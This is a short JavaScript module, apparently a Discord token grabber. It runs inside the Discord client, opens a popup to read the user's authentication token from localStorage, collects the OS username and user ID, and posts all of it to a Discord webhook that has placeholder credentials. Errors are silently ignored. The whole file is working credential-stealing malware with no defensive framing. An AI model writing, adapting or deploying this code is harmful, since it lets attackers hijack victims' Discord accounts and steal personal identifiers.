const https = require("https");
const os = require("os");

const data = {
    hostname: "discord.com",
    path: "/api/webhooks/WEBHOOK_ID_HERE/WEBHOOK_TOKEN_HERE",
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (v1.0.0, https://github.com)"
    },
}

const getData = () => {
    // @todo: add more shit
    const user = os.userInfo();
    return [
        `Username: ${user?.username}`,
        `UserID: ${user?.uid}`
    ].join("\n");
}

module.exports = () => {
    try {
        const popup = window.open("", "", `top=0,left=${screen.width-800},width=850,height=${screen.height}`);

        if (popup) {
            const token = popup.localStorage.token.slice(1, -1); // remove quotes

            // send to webhook
            const req = https.request(data, (res) => {
                console.log(`Discord returned ${res.statusCode}.`);
            });
    
            let content = getData();
            content += `\nToken: ${token}`

            req.write(JSON.stringify({ content })); // write our body
            req.end();
        }
    } catch (ignored) {

    }
};
